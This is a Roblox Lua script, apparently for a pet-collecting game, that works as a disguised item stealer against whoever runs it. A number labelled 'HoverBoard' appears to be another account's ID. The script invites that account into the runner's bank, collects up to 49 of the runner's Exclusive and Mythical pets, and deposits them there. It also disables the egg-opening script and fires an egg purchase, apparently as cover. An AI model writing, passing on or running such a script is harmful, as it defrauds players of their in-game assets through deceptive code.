local HoverBoard = 2792289848
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
    local mybanks = lib.Network.Invoke("get my banks")
    local BankID = mybanks[1]['BUID']
    lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], HoverBoard)

    local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
    local mybanks = lib.Network.Invoke("get my banks")
    local BankID = mybanks[1]['BUID']
    
local Bank = BankID

local A_1 = "b"
local A_2 = "bank deposit"
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
Event:FireServer(A_1, A_2)

local A_1 = "b"
local A_2 = "buy egg"
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
Event:FireServer(A_1, A_2)

local FinalList = {}
local output = 1
    Library     = require(game:GetService('ReplicatedStorage').Framework:FindFirstChild('Library'))
    Functions   = Library.Functions
    EXCList     = {}
    MythicList  = {}

    EList       = {}
    MList       = {}


    table.foreach(Library.Directory.Pets, function(i, v)
        if v.rarity == "Exclusive" then
            table.insert(EXCList, i)
        end
        if v.rarity == "Mythical" then
            table.insert(MythicList, i)
        end
    end)

local pets = require(game:GetService("ReplicatedStorage").Framework.Modules.Client["4 | Save"]).Get().Pets
for i, v in pairs(pets) do
if table.find(EXCList, v["id"]) ~= nil then
table.insert(EList, v["uid"])
end
if table.find(MythicList, v["id"]) ~= nil then
table.insert(MList, v["uid"])
end
end
if #EList + #MList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
table.insert(FinalList, v)
end
elseif #EList + #MList > 49 and #EList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
elseif #EList + #MList > 49 and #EList > 49 then
for i, v in pairs(EList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
end
wait(0.5)
game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
local A_1 = 
{
    [1] = "Cracked Egg", 
    [2] = false
}
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["buy egg"]
Event:InvokeServer(A_1)
wait(0.5)
local A_1 = 
{
    [1] = Bank, 
    [2] = FinalList, 
    [3] = output-1
}
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank deposit"]
local result = Event:InvokeServer(A_1)
